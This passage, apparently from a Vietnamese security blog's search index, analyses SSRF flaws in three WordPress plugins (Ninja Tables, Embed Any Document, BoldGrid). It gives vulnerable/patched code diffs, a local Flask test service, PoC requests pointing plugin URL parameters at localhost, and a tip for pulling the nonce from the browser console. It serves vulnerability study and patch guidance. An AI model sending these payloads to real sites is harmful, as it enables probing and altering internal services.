POC","uri":"/vi/posts/2025-11-03-cve-2025-2940/#exploit"},{"categories":["CVE Analysis"],"collections":null,"content":"Local Server\rT·∫°o local service ƒë∆°n gi·∫£n b·∫±ng python from flask import Flask, send_from_directory import os BASE_DIR = os.path.abspath(os.getcwd()) app = Flask(__name__) @app.route('/metadata') def metadata(): return send_from_directory(BASE_DIR, 'metadata.json', as_attachment=True) @app.route('/delete') def delete(): file_id = request.args.get('id') if not file_id: return \"No id provided\", 400 print(f\"delete it: {file_id}\") return f\"Delete it: {file_id}\" if __name__ == '__main__': app.run(host='0.0.0.0', port=8001, debug=True) ","date":"2025-11-03","objectID":"/vi/posts/2025-11-03-cve-2025-2940/:4:1","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-2940 Analysis \u0026 POC","uri":"/vi/posts/2025-11-03-cve-2025-2940/#local-server"},{"categories":["CVE Analysis"],"collections":null,"content":"Proof of Concept (PoC)\rG·ª≠i POST request v·ªõi URL tr·ªè ƒë·∫øn local service: POST /wp-admin/admin-post.php HTTP/1.1 Host: localhost User-Agent: Mozilla/5.0 Accept: */* Content-Type: application/x-www-form-urlencoded Content-Length: 146 Connection: close action=wpf-async-request-5198d2fbe51aebbce20ad69b9ada4d77993bbc77\u0026args[url]=http://localhost:8001/delete?id=1\u0026args[method]=GET\u0026args[name]=Tokuda Result: GET request t·ªõi local service\r","date":"2025-11-03","objectID":"/vi/posts/2025-11-03-cve-2025-2940/:4:2","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-2940 Analysis \u0026 POC","uri":"/vi/posts/2025-11-03-cve-2025-2940/#proof-of-concept-poc"},{"categories":["CVE Analysis"],"collections":null,"content":"Conclusion\rL·ªó h·ªïng SSRF trong Ninja Tables ‚â§ 5.0.18 cho th·∫•y tham s·ªë args[url] do client cung c·∫•p ƒë∆∞·ª£c s·ª≠ d·ª•ng tr·ª±c ti·∫øp ƒë·ªÉ th·ª±c hi·ªán request ph√≠a server m√† kh√¥ng ki·ªÉm tra, cho ph√©p attacker (kh√¥ng c·∫ßn x√°c th·ª±c) bu·ªôc ·ª©ng d·ª•ng truy c·∫≠p t·ªõi ƒë·ªãa ch·ªâ t√πy √Ω. B·∫£n v√° ‚â• 5.0.19 ƒë√£ lo·∫°i b·ªè ƒëo·∫°n m√£ nguy hi·ªÉm v√† kh·∫Øc ph·ª•c vector n√†y. ","date":"2025-11-03","objectID":"/vi/posts/2025-11-03-cve-2025-2940/:5:0","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-2940 Analysis \u0026 POC","uri":"/vi/posts/2025-11-03-cve-2025-2940/#conclusion"},{"categories":["CVE Analysis"],"collections":null,"content":"Key takeaways\rN√¢ng c·∫•p ngay l√™n 5.0.19 ho·∫∑c m·ªõi h∆°n. Kh√¥ng d√πng tr·ª±c ti·∫øp input c·ªßa client l√†m URL cho request ‚Äî validate/normalize tr∆∞·ªõc khi s·ª≠ d·ª•ng. √Åp d·ª•ng allowlist cho host/port v√† ch·∫∑n private IP ranges (127.0.0.0/8, 10.0.0.0/8, 192.168.0.0/16, v.v.). Tr√°nh ƒëƒÉng k√Ω endpoint admin_post_nopriv_* cho ch·ª©c nƒÉng th·ª±c hi·ªán outbound request ho·∫∑c th√™m ki·ªÉm so√°t quy·ªÅn/CSRF. ","date":"2025-11-03","objectID":"/vi/posts/2025-11-03-cve-2025-2940/:6:0","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-2940 Analysis \u0026 POC","uri":"/vi/posts/2025-11-03-cve-2025-2940/#key-takeaways"},{"categories":["CVE Analysis"],"collections":null,"content":"References\rSSRF (Server Side Request Forgery) ‚Äî Hacktrick WordPress Ninja Tables Plugin \u003c= 5.0.18 is vulnerable to Server Side Request Forgery (SSRF) ","date":"2025-11-03","objectID":"/vi/posts/2025-11-03-cve-2025-2940/:7:0","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-2940 Analysis \u0026 POC","uri":"/vi/posts/2025-11-03-cve-2025-2940/#references"},{"categories":["CVE Analysis"],"collections":null,"content":"Security Vulnerability in WordPress Embed Any Document Plugin.","date":"2025-11-02","objectID":"/vi/posts/2025-11-02-cve-2025-1043/","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-1043 Analysis \u0026 POC","uri":"/vi/posts/2025-11-02-cve-2025-1043/"},{"categories":["CVE Analysis"],"collections":null,"content":"CVE \u0026 Basic Info\rPlugin ‚ÄúEmbed Any Document ‚Äì Embed PDF, Word, PowerPoint and Excel Files‚Äù cho WordPress c√≥ l·ªó h·ªïng Server-Side Request Forgery (SSRF) trong t·∫•t c·∫£ c√°c phi√™n b·∫£n ƒë·∫øn v√† bao g·ªìm 2.7.5 th√¥ng qua shortcode 'embeddoc'. L·ªó h·ªïng n√†y cho ph√©p nh·ªØng k·∫ª t·∫•n c√¥ng ƒë√£ x√°c th·ª±c, c√≥ quy·ªÅn truy c·∫≠p ·ªü m·ª©c Contributor tr·ªü l√™n, th·ª±c hi·ªán c√°c y√™u c·∫ßu web t·ªõi c√°c ƒë·ªãa ch·ªâ t√πy √Ω xu·∫•t ph√°t t·ª´ ·ª©ng d·ª•ng web v√† c√≥ th·ªÉ ƒë∆∞·ª£c s·ª≠ d·ª•ng ƒë·ªÉ truy v·∫•n v√† s·ª≠a ƒë·ªïi th√¥ng tin t·ª´ c√°c d·ªãch v·ª• n·ªôi b·ªô. CVE ID: CVE-2025-1043 Vulnerability Type: Server Side Request Forgery (SSRF) Affected Versions: \u003c= 2.7.5 Patched Versions: 2.7.6 CVSS severity: Low (4.9) Required Privilege: Contributor Product: WordPress Embed Any Document Plugin ","date":"2025-11-02","objectID":"/vi/posts/2025-11-02-cve-2025-1043/:1:0","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-1043 Analysis \u0026 POC","uri":"/vi/posts/2025-11-02-cve-2025-1043/#cve--basic-info"},{"categories":["CVE Analysis"],"collections":null,"content":"Requirements\rLocal WordPress \u0026 Debugging: Local WordPress and Debugging. Plugin versions - Embed Any Document: 2.7.5 (vulnerable) v√† 2.7.6 (patched). Diff tool - Meld ho·∫∑c b·∫•t k·ª≥ c√¥ng c·ª• so s√°nh (diff) n√†o ƒë·ªÉ ki·ªÉm tra v√† so s√°nh kh√°c bi·ªát gi·ªØa hai phi√™n b·∫£n. ","date":"2025-11-02","objectID":"/vi/posts/2025-11-02-cve-2025-1043/:2:0","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-1043 Analysis \u0026 POC","uri":"/vi/posts/2025-11-02-cve-2025-1043/#requirements"},{"categories":["CVE Analysis"],"collections":null,"content":"Analysis\r","date":"2025-11-02","objectID":"/vi/posts/2025-11-02-cve-2025-1043/:3:0","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-1043 Analysis \u0026 POC","uri":"/vi/posts/2025-11-02-cve-2025-1043/#analysis"},{"categories":["CVE Analysis"],"collections":null,"content":"Patch diff\rpublic function embed_shortcode( $atts ) { ... $show = false; $shortcode_atts = shortcode_atts( array( 'url' =\u003e '', 'drive' =\u003e '', 'viewer' =\u003e $default_provider, 'download' =\u003e $default_download, ... ), $atts ); if ( isset( $shortcode_atts['url'] ) \u0026\u0026 ! empty( $shortcode_atts['url'] ) ) : ... if ( $this-\u003eallowdownload( $shortcode_atts['viewer'] ) ) { if ( $shortcode_atts['download'] === 'alluser' || $shortcode_atts['download'] === 'all' ) { $show = true; } elseif ( $shortcode_atts['download'] === 'logged' \u0026\u0026 is_user_logged_in() ) { $show = true; } } $url = esc_url( $shortcode_atts['url'], array( 'http', 'https' ) ); if ( $show ) { $filedata = wp_remote_head( $shortcode_atts['url'] ); ... } ... return $embed; } Trong phi√™n b·∫£n l·ªói, h√†m embed_shortcode() th·ª±c hi·ªán m·ªôt HTTP HEAD request b·∫±ng h√†m wp_remote_head() v·ªõi gi√° tr·ªã url ƒë∆∞·ª£c l·∫•y tr·ª±c ti·∫øp t·ª´ $shortcode_atts['url']. Do kh√¥ng c√≥ b·∫•t k·ª≥ c∆° ch·∫ø x√°c th·ª±c, l·ªçc, ho·∫∑c gi·ªõi h·∫°n ph·∫°m vi URL, k·∫ª t·∫•n c√¥ng c√≥ th·ªÉ ch√®n v√†o ƒë√≥ m·ªôt ƒë∆∞·ªùng d·∫´n t√πy √Ω =\u003e D·∫´n ƒë·∫øn request c√≥ th·ªÉ g·ª≠i ƒë·∫øn c√°c local service kh√°c g·∫•y SSRF public function embed_shortcode( $atts ) { ... $show = false; $shortcode_atts = shortcode_atts( array( 'url' =\u003e '', 'drive' =\u003e '', 'viewer' =\u003e $default_provider, 'download' =\u003e $default_download, ... ), $atts ); if ( isset( $shortcode_atts['url'] ) \u0026\u0026 ! empty( $shortcode_atts['url'] ) ) : ... if ( $this-\u003eallowdownload( $shortcode_atts['viewer'] ) ) { if ( $shortcode_atts['download'] === 'alluser' || $shortcode_atts['download'] === 'all' ) { $show = true; } elseif ( $shortcode_atts['download'] === 'logged' \u0026\u0026 is_user_logged_in() ) { $show = true; } } $url = esc_url( $shortcode_atts['url'], array( 'http', 'https' ) ); if ( $show ) { $filedata = wp_safe_remote_head( $shortcode_atts['url'] ); ... } ... return $embed; } B·∫£n v√° ƒë√£ thay th·∫ø vi·ªác s·ª≠ d·ª•ng wp_remote_head() b·∫±ng h√†m wp_safe_remote_head(), h√†m n√†y b·ªï sung c√°c c∆° ch·∫ø ki·ªÉm tra an to√†n nh·∫±m ngƒÉn ch·∫∑n truy c·∫≠p ƒë·∫øn c√°c ƒë·ªãa ch·ªâ n·ªôi b·ªô, private, loopback ho·∫∑c link-local, qua ƒë√≥ gi·∫£m thi·ªÉu nguy c∆° t·∫•n c√¥ng SSRF. ","date":"2025-11-02","objectID":"/vi/posts/2025-11-02-cve-2025-1043/:3:1","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-1043 Analysis \u0026 POC","uri":"/vi/posts/2025-11-02-cve-2025-1043/#patch-diff"},{"categories":["CVE Analysis"],"collections":null,"content":"Vulnerable Code\rƒê·ªÉ ƒëo·∫°n wp_remote_head( $shortcode_atts['url'] ) trong embed_shortcode() th·ª±c s·ª± ƒë∆∞·ª£c g·ªçi, ta c·∫ßn bypass t·∫•t c·∫£ c√°c r√†ng bu·ªôc sau: url ph·∫£i t·ªìn t·∫°i v√† kh√¥ng r·ªóng if ( isset( $shortcode_atts['url'] ) \u0026\u0026 ! empty( $shortcode_atts['url'] ) ) Bi·∫øn $show ph·∫£i ƒë∆∞·ª£c ƒë·∫∑t th√†nh true tr∆∞·ªõc khi v√†o kh·ªëi g·ªçi HEAD $show m·∫∑c ƒë·ªãnh false. N√≥ ch·ªâ tr·ªü th√†nh true khi if ( $this-\u003eallowdownload( $shortcode_atts['viewer'] ) ) tr·∫£ v·ªÅ true v√† m·ªôt trong hai ƒëi·ªÅu ki·ªán sau ƒë√∫ng: if ( $this-\u003eallowdownload( $shortcode_atts['viewer'] ) ) { if ( $shortcode_atts['download'] === 'alluser' || $shortcode_atts['download'] === 'all' ) { $show = true; } elseif ( $shortcode_atts['download'] === 'logged' \u0026\u0026 is_user_logged_in() ) { $show = true; } } download b·∫±ng 'alluser' ho·∫∑c 'all'. download b·∫±ng 'logged' v√† is_user_logged_in() tr·∫£ v·ªÅ true (t·ª©c ng∆∞·ªùi d√πng ƒë√£ ƒëƒÉng nh·∫≠p). public function allowdownload( $provider ) { $blacklist = array( 'drive', 'box' ); if ( in_array( $provider, $blacklist, true ) ) { return false; } else { return true; } } allowdownload() s·∫Ω tr·∫£ v·ªÅ true n·∫øu $provider ($shortcode_atts['viewer']) kh√¥ng t·ªìn t·∫°i ho·∫∑c kh√¥ng n·∫±m trong $blacklist L·ªói\rV√¨ SSRF d√πng HTTP HEAD n√™n kh√¥ng ƒë·ªçc ƒë∆∞·ª£c body tr·ª±c ti·∫øp, nh∆∞ng v·∫´n c√≥ th·ªÉ l·ªô metadata (Content-Type, Content-Length) v√† thƒÉm d√≤/kh√°m ph√° c√°c endpoint n·ªôi b·ªô. N·∫øu endpoint kh√¥ng ph√¢n bi·ªát method c√≥ th·ªÉ d·∫´n ƒë·∫øn thay ƒë·ªïi, x√≥a d·ªØ li·ªáu nh·∫°y c·∫£m.\rembed_shortcode() ƒë∆∞·ª£c ƒëƒÉng k√Ω l√†m callback cho shortcode: add_shortcode( 'embeddoc', array( $this, 'embed_shortcode' ) ); ","date":"2025-11-02","objectID":"/vi/posts/2025-11-02-cve-2025-1043/:3:2","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-1043 Analysis \u0026 POC","uri":"/vi/posts/2025-11-02-cve-2025-1043/#vulnerable-code"},{"categories":["CVE Analysis"],"collections":null,"content":"Flow\rgraph TD\rA[\"Shortcode: [embeddoc url=...]\"] --\u003e B[\"embed_shortcode($atts)\"]\rB --\u003e C{\"isset($shortcode_atts['url']) \u0026\u0026 !empty(...)?\"}\rC -- Yes --\u003e D{\"$this-\u003eallowdownload($shortcode_atts['viewer'])?\"}\rC -- No --\u003e End1[No request]\rD -- Yes --\u003e E{\"download == 'all'|'alluser' OR (download=='logged' \u0026\u0026 is_user_logged_in())?\"}\rD -- No --\u003e End2[No request]\rE -- Yes --\u003e F[\"wp_remote_head($shortcode_atts['url']) ‚Üê SSRF sink\"]\rE -- No --\u003e End3[No request]\rF --\u003e G[\"Return to client\"]\rgraph TD\rA[\"Shortcode: [embeddoc url=...]\"] --\u003e B[\"embed_shortcode($atts)\"]\rB --\u003e C{\"isset($shortcode_atts['url']) \u0026\u0026 !empty(...)?\"}\rC -- Yes --\u003e D{\"$this-\u003eallowdownload($shortcode_atts['viewer'])?\"}\rC -- No --\u003e End1[No request]\rD -- Yes --\u003e E{\"download == 'all'|'alluser' OR (download=='logged' \u0026\u0026 is_user_logged_in())?\"}\rD -- No --\u003e End2[No request]\rE -- Yes --\u003e F[\"wp_remote_head($shortcode_atts['url']) ‚Üê SSRF sink\"]\rE -- No --\u003e End3[No request]\rF --\u003e G[\"Return to client\"]\rgraph TD\rA[\"Shortcode: [embeddoc url=...]\"] --\u003e B[\"embed_shortcode($atts)\"]\rB --\u003e C{\"isset($shortcode_atts['url']) \u0026\u0026 !empty(...)?\"}\rC -- Yes --\u003e D{\"$this-\u003eallowdownload($shortcode_atts['viewer'])?\"}\rC -- No --\u003e End1[No request]\rD -- Yes --\u003e E{\"download == 'all'|'alluser' OR (download=='logged' \u0026\u0026 is_user_logged_in())?\"}\rD -- No --\u003e End2[No request]\rE -- Yes --\u003e F[\"wp_remote_head($shortcode_atts['url']) ‚Üê SSRF sink\"]\rE -- No --\u003e End3[No request]\rF --\u003e G[\"Return to client\"]\rgraph TD\rA[\"Shortcode: [embeddoc url=...]\"] --\u003e B[\"embed_shortcode($atts)\"]\rB --\u003e C{\"isset($shortcode_atts['url']) \u0026\u0026 !empty(...)?\"}\rC -- Yes --\u003e D{\"$this-\u003eallowdownload($shortcode_atts['viewer'])?\"}\rC -- No --\u003e End1[No request]\rD -- Yes --\u003e E{\"download == 'all'|'alluser' OR (download=='logged' \u0026\u0026 is_user_logged_in())?\"}\rD -- No --\u003e End2[No request]\rE -- Yes --\u003e F[\"wp_remote_head($shortcode_atts['url']) ‚Üê SSRF sink\"]\rE -- No --\u003e End3[No request]\rF --\u003e G[\"Return to client\"]\r","date":"2025-11-02","objectID":"/vi/posts/2025-11-02-cve-2025-1043/:3:3","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-1043 Analysis \u0026 POC","uri":"/vi/posts/2025-11-02-cve-2025-1043/#flow"},{"categories":["CVE Analysis"],"collections":null,"content":"Exploit\r","date":"2025-11-02","objectID":"/vi/posts/2025-11-02-cve-2025-1043/:4:0","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-1043 Analysis \u0026 POC","uri":"/vi/posts/2025-11-02-cve-2025-1043/#exploit"},{"categories":["CVE Analysis"],"collections":null,"content":"Local Server\rT·∫°o local service ƒë∆°n gi·∫£n b·∫±ng python from flask import Flask, send_from_directory import os BASE_DIR = os.path.abspath(os.getcwd()) app = Flask(__name__) @app.route('/metadata') def metadata(): return send_from_directory(BASE_DIR, 'metadata.json', as_attachment=True) @app.route('/delete') def delete(): file_id = request.args.get('id') if not file_id: return \"No id provided\", 400 print(f\"delete it: {file_id}\") return f\"Delete it: {file_id}\" if __name__ == '__main__': app.run(host='0.0.0.0', port=8001, debug=True) ","date":"2025-11-02","objectID":"/vi/posts/2025-11-02-cve-2025-1043/:4:1","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-1043 Analysis \u0026 POC","uri":"/vi/posts/2025-11-02-cve-2025-1043/#local-server"},{"categories":["CVE Analysis"],"collections":null,"content":"Proof of Concept (PoC)\rLogin b·∫±ng t√†i kho·∫£n Contributor T·∫°o post v·ªõi shortcode [embeddoc url=http://localhost:8001/delete?id=1 download=all] Result: HEAD request t·ªõi local service\r","date":"2025-11-02","objectID":"/vi/posts/2025-11-02-cve-2025-1043/:4:2","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-1043 Analysis \u0026 POC","uri":"/vi/posts/2025-11-02-cve-2025-1043/#proof-of-concept-poc"},{"categories":["CVE Analysis"],"collections":null,"content":"Conclusion\rCVE-2025-1043 l√† SSRF do plugin g·ªçi wp_remote_head() v·ªõi URL t·ª´ shortcode m√† kh√¥ng ki·ªÉm tra. D√π l√† HEAD (kh√¥ng c√≥ body), v·∫´n c√≥ th·ªÉ l·ªô metadata, thƒÉm d√≤ d·ªãch v·ª• n·ªôi b·ªô ho·∫∑c, khi c√≥ redirect/endpoint kh√¥ng ph√¢n bi·ªát method, g√¢y thay ƒë·ªïi tr·∫°ng th√°i. B·∫£n v√° (v2.7.6) d√πng esc_url_raw() + wp_safe_remote_head() ƒë·ªÉ gi·∫£m r·ªßi ro. ","date":"2025-11-02","objectID":"/vi/posts/2025-11-02-cve-2025-1043/:5:0","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-1043 Analysis \u0026 POC","uri":"/vi/posts/2025-11-02-cve-2025-1043/#conclusion"},{"categories":["CVE Analysis"],"collections":null,"content":"Key takeaways\rNguy√™n nh√¢n: thi·∫øu l·ªçc/whitelist URL tr∆∞·ªõc khi g·ªçi HTTP t·ª´ server. ·∫¢nh h∆∞·ªüng: metadata leak, internal discovery, kh·∫£ nƒÉng chu·ªói t·∫•n c√¥ng (redirect ‚Üí GET, method-agnostic endpoints). Fix: c·∫≠p nh·∫≠t l√™n v2.7.6. Khuy·∫øn ngh·ªã ng·∫Øn: d√πng wp_safe_remote_*, esc_url_raw()/whitelist, t·∫Øt redirect khi ch·ªâ c·∫ßn header, v√† gi·ªõi h·∫°n quy·ªÅn ng∆∞·ªùi d√πng. ","date":"2025-11-02","objectID":"/vi/posts/2025-11-02-cve-2025-1043/:6:0","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-1043 Analysis \u0026 POC","uri":"/vi/posts/2025-11-02-cve-2025-1043/#key-takeaways"},{"categories":["CVE Analysis"],"collections":null,"content":"References\rSSRF (Server Side Request Forgery) ‚Äî Hacktrick WordPress Embed Any Document Plugin \u003c= 2.7.5 is vulnerable to Server Side Request Forgery (SSRF) ","date":"2025-11-02","objectID":"/vi/posts/2025-11-02-cve-2025-1043/:7:0","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-1043 Analysis \u0026 POC","uri":"/vi/posts/2025-11-02-cve-2025-1043/#references"},{"categories":["CVE Analysis"],"collections":null,"content":"Security Vulnerability in WordPress Post and Page Builder by BoldGrid ‚Äì Visual Drag and Drop Editor Plugin.","date":"2025-11-01","objectID":"/vi/posts/2025-11-01-cve-2025-52713/","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-52713 Analysis \u0026 POC","uri":"/vi/posts/2025-11-01-cve-2025-52713/"},{"categories":["CVE Analysis"],"collections":null,"content":"CVE \u0026 Basic Info\rL·ªó h·ªïng Server-Side Request Forgery (SSRF) trong plugin BoldGrid Post and Page Builder by BoldGrid ‚Äì Visual Drag and Drop Editor cho ph√©p k·∫ª t·∫•n c√¥ng th·ª±c hi·ªán y√™u c·∫ßu gi·∫£ m·∫°o t·ª´ ph√≠a m√°y ch·ªß. V·∫•n ƒë·ªÅ n√†y ·∫£nh h∆∞·ªüng ƒë·∫øn plugin Post and Page Builder by BoldGrid ‚Äì Visual Drag and Drop Editor t·ª´ phi√™n b·∫£n ch∆∞a x√°c ƒë·ªãnh cho ƒë·∫øn 1.27.8. CVE ID: CVE-2025-52713 Vulnerability Type: Server Side Request Forgery (SSRF) Affected Versions: \u003c= 1.27.8 Patched Versions: 1.27.9 CVSS severity: Low (6.4) Required Privilege: Contributor Product: WordPress Post and Page Builder by BoldGrid ‚Äì Visual Drag and Drop Editor Plugin ","date":"2025-11-01","objectID":"/vi/posts/2025-11-01-cve-2025-52713/:1:0","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-52713 Analysis \u0026 POC","uri":"/vi/posts/2025-11-01-cve-2025-52713/#cve--basic-info"},{"categories":["CVE Analysis"],"collections":null,"content":"Requirements\rLocal WordPress \u0026 Debugging: Local WordPress and Debugging. Plugin versions - Post and Page Builder by BoldGrid ‚Äì Visual Drag and Drop Editor: 1.27.8 (vulnerable) v√† 1.27.9 (patched). Diff tool - Meld ho·∫∑c b·∫•t k·ª≥ c√¥ng c·ª• so s√°nh (diff) n√†o ƒë·ªÉ ki·ªÉm tra v√† so s√°nh kh√°c bi·ªát gi·ªØa hai phi√™n b·∫£n. ","date":"2025-11-01","objectID":"/vi/posts/2025-11-01-cve-2025-52713/:2:0","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-52713 Analysis \u0026 POC","uri":"/vi/posts/2025-11-01-cve-2025-52713/#requirements"},{"categories":["CVE Analysis"],"collections":null,"content":"Analysis\r","date":"2025-11-01","objectID":"/vi/posts/2025-11-01-cve-2025-52713/:3:0","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-52713 Analysis \u0026 POC","uri":"/vi/posts/2025-11-01-cve-2025-52713/#analysis"},{"categories":["CVE Analysis"],"collections":null,"content":"Patch diff\rpublic function get_redirect_url() { $urls = ! empty( $_POST['urls'] ) ? $_POST['urls'] : null; self::validate_nonce( 'image' ); $unsplash_404 = 'https://images.unsplash.com/photo-1446704477871-62a4972035cd?fit=crop\u0026fm=jpg\u0026h=800\u0026q=50\u0026w=1200'; $redirectUrls = array(); foreach( $urls as $url ) { $response = wp_remote_head( $url ); $headers = is_array( $response ) \u0026\u0026 ! empty( $response['headers'] ) ? $response['headers']-\u003egetAll() : array(); $redirectUrl = ! empty( $headers['location'] ) ? $headers['location'] : false; $redirectUrl = ( $redirectUrl !== $unsplash_404 ) ? $redirectUrl : false; $redirectUrls[ $url ] = $redirectUrl; } if ( ! empty( $redirectUrls ) ) { wp_send_json_success( $redirectUrls ); } else { status_header( 400 ); wp_send_json_error(); } } Trong phi√™n b·∫£n l·ªói, h√†m get_redirect_url() nh·∫≠n m·∫£ng URL t·ª´ $_POST['urls'], sau ƒë√≥ duy·ªát qua t·ª´ng ph·∫ßn t·ª≠ v√† g·ª≠i request b·∫±ng wp_remote_head($url) m√† kh√¥ng h·ªÅ ki·ªÉm tra ho·∫∑c l·ªçc d·ªØ li·ªáu ƒë·∫ßu v√†o. Vi·ªác n√†y cho ph√©p k·∫ª t·∫•n c√¥ng t·ª± cung c·∫•p URL t√πy √Ω ƒë·ªÉ m√°y ch·ªß g·ª≠i y√™u c·∫ßu t·ªõi c√°c ƒë·ªãa ch·ªâ n·ªôi b·ªô nh∆∞ 127.0.0.1 ho·∫∑c 169.254.169.254, d·∫´n ƒë·∫øn l·ªó h·ªïng SSRF. Ngo√†i ra, do kh√¥ng gi·ªõi h·∫°n timeout hay s·ªë l·∫ßn redirection, h√†m c√≤n c√≥ th·ªÉ b·ªã l·ª£i d·ª•ng ƒë·ªÉ g√¢y treo ho·∫∑c t·∫•n c√¥ng t·ª´ ch·ªëi d·ªãch v·ª• (DoS). public function get_redirect_url() { $urls = ! empty( $_POST['urls'] ) ? $_POST['urls'] : null; self::validate_nonce( 'image' ); $unsplash_404 = 'https://images.unsplash.com/photo-1446704477871-62a4972035cd?fit=crop\u0026fm=jpg\u0026h=800\u0026q=50\u0026w=1200'; $redirectUrls = array(); foreach( $urls as $url ) { $response = wp_safe_remote_head( esc_url_raw( $url ), array( 'timeout' =\u003e 5, 'redirection' =\u003e 5, ) ); $headers = is_array( $response ) \u0026\u0026 ! empty( $response['headers'] ) ? $response['headers']-\u003egetAll() : array(); $redirectUrl = ! empty( $headers['location'] ) ? $headers['location'] : false; $redirectUrl = ( $redirectUrl !== $unsplash_404 ) ? $redirectUrl : false; $redirectUrls[ $url ] = $redirectUrl; } if ( ! empty( $redirectUrls ) ) { wp_send_json_success( $redirectUrls ); } else { status_header( 400 ); wp_send_json_error(); } } B·∫£n v√° ƒë√£ thay wp_remote_head() b·∫±ng wp_safe_remote_head() k·∫øt h·ª£p v·ªõi esc_url_raw() ƒë·ªÉ l·ªçc v√† ch·ªâ cho ph√©p URL h·ª£p l·ªá, ƒë·ªìng th·ªùi b·ªï sung c√°c tham s·ªë b·∫£o v·ªá nh∆∞ timeout =\u003e 5 v√† redirection =\u003e 5. Nh·ªù ƒë√≥, h√†m ch·ªâ g·ª≠i request ƒë·∫øn c√°c host an to√†n, ngƒÉn SSRF v√† h·∫°n ch·∫ø c√°c r·ªßi ro v·ªÅ hi·ªáu nƒÉng. ","date":"2025-11-01","objectID":"/vi/posts/2025-11-01-cve-2025-52713/:3:1","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-52713 Analysis \u0026 POC","uri":"/vi/posts/2025-11-01-cve-2025-52713/#patch-diff"},{"categories":["CVE Analysis"],"collections":null,"content":"Vulnerable Code\rH√†m self::validate_nonce( 'image' ); trong ƒëo·∫°n m√£ ƒë∆∞·ª£c g·ªçi ƒë·ªÉ x√°c th·ª±c nonce ‚Äî m·ªôt c∆° ch·∫ø b·∫£o v·ªá c·ªßa WordPress nh·∫±m ngƒÉn CSRF (Cross-Site Request Forgery). public static function validate_nonce( $name ) { $nonce = ! empty( $_POST[ self::$nonces[ $name ] ] ) ? $_POST[ self::$nonces[ $name ] ] : null; $valid = wp_verify_nonce( $nonce, self::$nonces[ $name ] ); if ( ! $valid ) { status_header( 401 ); wp_send_json_error(); } } C·ª• th·ªÉ, plugin ƒë·ªãnh nghƒ©a m·ªôt m·∫£ng tƒ©nh $nonces ch·ª©a c√°c t√™n nonce t∆∞∆°ng ·ª©ng v·ªõi t·ª´ng h√†nh ƒë·ªông: protected static $nonces = array( 'image' =\u003e 'boldgrid_gridblock_image_ajax_nonce', 'setup' =\u003e 'boldgrid_editor_setup', 'gridblock_save' =\u003e 'boldgrid_editor_gridblock_save', ); Khi h√†m validate_nonce('image') ƒë∆∞·ª£c g·ªçi, n√≥ s·∫Ω: L·∫•y gi√° tr·ªã nonce t·ª´ request POST theo key boldgrid_gridblock_image_ajax_nonce. Ki·ªÉm tra gi√° tr·ªã n√†y b·∫±ng wp_verify_nonce(). N·∫øu nonce kh√¥ng h·ª£p l·ªá (nghƒ©a l√† request kh√¥ng ƒë∆∞·ª£c kh·ªüi t·∫°o t·ª´ trang WordPress h·ª£p ph√°p), h√†m s·∫Ω tr·∫£ v·ªÅ HTTP 401 Unauthorized v√† d·ª´ng x·ª≠ l√Ω th√¥ng qua wp_send_json_error(). M·∫πo\rKhi t√¨m ki·∫øm t·ª´ kh√≥a boldgrid_gridblock_image_ajax_nonce trong m√£ ngu·ªìn plugin, ta th·∫•y gi√° tr·ªã n√†y ƒë∆∞·ª£c g√°n t·ª´ bi·∫øn JavaScript BoldgridEditor.grid_block_nonce. Gi√° tr·ªã c·ªßa nonce trong JS\rDo ƒë√¢y l√† y√™u c·∫ßu AJAX ƒë∆∞·ª£c g·ª≠i t·ª´ ph√≠a client, n√™n ƒë·ªÉ l·∫•y nonce hi·ªán t·∫°i, ta c√≥ th·ªÉ m·ªü Console tr√™n tr√¨nh duy·ªát v√† g·ªçi: BoldgridEditor.grid_block_nonce khi t·∫°o post b·∫±ng plugin n√†y. Gi√° tr·ªã c·ªßa nonce trong console\rget_redirect_url() ƒë∆∞·ª£c ƒëƒÉng k√Ω l√†m callback cho action hook: add_action( 'wp_ajax_boldgrid_redirect_url', array( $boldgrid_editor_ajax, 'get_redirect_url' ) ); ƒêi·ªÅu n√†y c√≥ nghƒ©a l√†: Khi client g·ª≠i request AJAX ƒë·∫øn endpoint /wp-admin/admin-ajax.php?action=boldgrid_redirect_url th√¨ get_redirect_url() s·∫Ω ƒë∆∞·ª£c g·ªçi ","date":"2025-11-01","objectID":"/vi/posts/2025-11-01-cve-2025-52713/:3:2","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-52713 Analysis \u0026 POC","uri":"/vi/posts/2025-11-01-cve-2025-52713/#vulnerable-code"},{"categories":["CVE Analysis"],"collections":null,"content":"Flow\rgraph TD\rA[\"Client POST /wp-admin/admin-ajax.php?action=boldgrid_redirect_url + $_POST['urls']\"] --\u003e B[\"wp_ajax_boldgrid_redirect_url ‚Üí get_redirect_url()\"]\rB --\u003e C[\"self::validate_nonce('image')\"]\rC --\u003e D[\"read $_POST['urls']\"]\rD --\u003e E[\"foreach $url\"]\rE --\u003e F[\"wp_remote_head($url) ‚Üê SSRF sink\"]\rF --\u003e G[\"extract headers['location'] ‚Üí $redirectUrls\"]\rG --\u003e H{\"$redirectUrls not empty?\"}\rH -- Yes --\u003e I[\"wp_send_json_success($redirectUrls)\"]\rH -- No --\u003e J[\"wp_send_json_error()\"]\rgraph TD\rA[\"Client POST /wp-admin/admin-ajax.php?action=boldgrid_redirect_url + $_POST['urls']\"] --\u003e B[\"wp_ajax_boldgrid_redirect_url ‚Üí get_redirect_url()\"]\rB 